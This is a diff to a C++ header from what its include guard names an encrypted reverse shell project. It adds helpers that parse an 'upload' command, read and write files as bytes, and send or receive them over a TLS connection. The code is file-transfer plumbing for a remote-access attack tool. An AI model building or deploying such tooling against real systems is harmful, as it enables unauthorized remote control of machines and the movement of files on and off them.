@@ -13,6 +13,7 @@
 #include <fcntl.h>
 #include <sys/wait.h>
 #include <pty.h>
+#include <vector>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 
@@ -76,50 +77,119 @@ inline void safeShutdown(const std::string& msgToSnd, const int socket, const in
     SSL_CTX_free(ctx);
     exit(EXIT_FAILURE);
 }
-// example server fileToUpload (ttyBuffer), pathToUploadTo
-inline char* uploadFile(const std::string& clientOrServer, const char* fileToUpload, const std::string& pathToUploadTo) {
+// Function returns the file path of the file we want as an std::string
+inline std::string parseUploadCommand(const char* command) {
+    // command will be ttyBuffer
+    // delete useless information
+    // return filePath to file wanting to upload
 
-    if (clientOrServer == "server") {
-        std::ifstream inputFile(fileToUpload, std::ios::binary | std::ios::ate);
+    // ttyBuffer will look like this =
+    // "upload /myfile/file.bin\nCONSOLE----"
+    // need to just extract that "/myfile/file.bin"
 
-        if (!inputFile) {
-            std::cout << "[!] Error opening file " << fileToUpload << std::endl;
-            return nullptr;
+    std::string inputStr = command;
+
+    size_t newLinePos = inputStr.find("\n"); // first get everything before the newline
+
+    std::string tmpStr = inputStr.substr(0, newLinePos);
+
+    // tmpStr is now "upload /myfile/file.bin"
+    // we now need to just extract everthing after "upload "
+    // which we can do by just finding where the space is
+
+    size_t spacePos = tmpStr.find(" ");
+
+    std::cout << tmpStr.substr(spacePos + 1) << std::endl;
+
+    return tmpStr.substr(spacePos + 1);
+}
+
+inline std::vector<std::byte> readFileAsByteVector(const std::string& filePath) {
+    std::ifstream inputFile(filePath, std::ios::binary | std::ios::ate);
+
+    if (!inputFile) {
+        std::cout << "[!] Error opening file " << filePath << std::endl;
+        return {};
+    }
+
+    std::streamsize fileSize = inputFile.tellg();
+    inputFile.seekg(0, std::ios::beg);
+
+    std::vector<std::byte> fileBuffer (fileSize);
+
+    if (!inputFile.read(reinterpret_cast<char*>(fileBuffer.data()), fileSize)) {
+        std::cout << "[!] Error reading file " << filePath << std::endl;
+    }
+
+    inputFile.close();
+
+    return fileBuffer;
+}
+
+inline bool writeBytesToFile(std::vector<std::byte> fileBuffer, const std::string& filePath) {
+    std::ofstream outputFile(filePath, std::ios::binary | std::ios::ate);
+
+    if (!outputFile) {
+        std::cout << "[!] Error opening file " << filePath << std::endl;
+        return false;
+    }
+
+    if (!outputFile.write(reinterpret_cast<char*>(fileBuffer.data()), fileBuffer.size())) {
+        std::cout << "[!] Error writing file " << filePath << std::endl;
+        return false;
+    }
+
+    std::cout << "[+] Successfully wrote " << filePath << std::endl;
+
+    return true;
+}
+
+// with this were under the impression that everything has been parsed correctly
+inline void prepareAndSendFile(SSL* ssl, const std::vector<std::byte>& fileBuffer, const std::string& command) {
+
+    // send the command we want to use so the server/client knows what to expect(upload/download)
+    SSL_write(ssl, command.c_str(), command.size());
+
+    // get the file size
+    auto fileSize = static_cast<uint32_t>(fileBuffer.size());
+    // convert to byte order for compatibility
+    fileSize = htonl(fileSize);
+    // tell the server/client the size of the file so that it is wanted to be sent.
+    SSL_write(ssl, &fileSize, sizeof(fileSize));
+
+    // finally send the file
+    SSL_write(ssl, fileBuffer.data(), fileBuffer.size());
+}
+
+inline std::vector<std::byte> handleIncomingFile(SSL* ssl, const char* commandBuffer) {
+    if (std::string(commandBuffer) == "upload") {
+        //read the file size
+        uint32_t fileSize = 0;
+        SSL_read(ssl, &fileSize, sizeof(fileSize));
+        // convert from network byte order to host byte order
+        // again to improve compatibility
+        fileSize = ntohl(fileSize);
+
+        // read the actual file data
+        std::vector<std::byte> fileBuffer (fileSize);
+        size_t totalRead = 0;
+
+        // loop through and wait until we have the entire file
+        while (totalRead < fileSize) {
+            int bytesRead = SSL_read(ssl, reinterpret_cast<char*>(fileBuffer.data() + totalRead), fileSize - totalRead);
+
+            if (bytesRead <= 0) {
+                std::cout << "Failed to read Incoming File!!" << std::endl;
+                break;
+            }
+
+            totalRead += bytesRead;
         }
 
-        std::streamsize fileSize = inputFile.tellg();
-        inputFile.seekg(0, std::ios::beg);
-
-        char* fileBuffer = new char[fileSize];
-
-        if (!inputFile.read(fileBuffer, fileSize)) {
-            std::cout << "[!] Error reading file " << fileToUpload << std::endl;
-            return nullptr;
-        }
-
-        inputFile.close();
-
-        char* returnChar = new char[fileSize];
-
-        strcpy(returnChar, fileBuffer);
-
-        return returnChar;
+        return fileBuffer;
     }
-    else if (clientOrServer == "client") {
 
-        // need to parse incoming buffer at fileToUpload
-        // theoretically it will contain the string "upload\n" everything after will be the file.
-        ssize_t uploadStrSize = sizeof("upload\n") - 1;
-
-        std::string tmpStr (fileToUpload);
-        tmpStr = tmpStr.substr(uploadStrSize);
-
-        fileToUpload = tmpStr.c_str();
-
-        std::ofstream outputFile((pathToUploadTo), std::ios::binary | std::ios::ate);
-
-        outputFile.write(fileToUpload, strlen(fileToUpload));
-    }
+    return {};
 }
 
 #endif //ENCRYPTED_REV_SHELL_UTILS_H
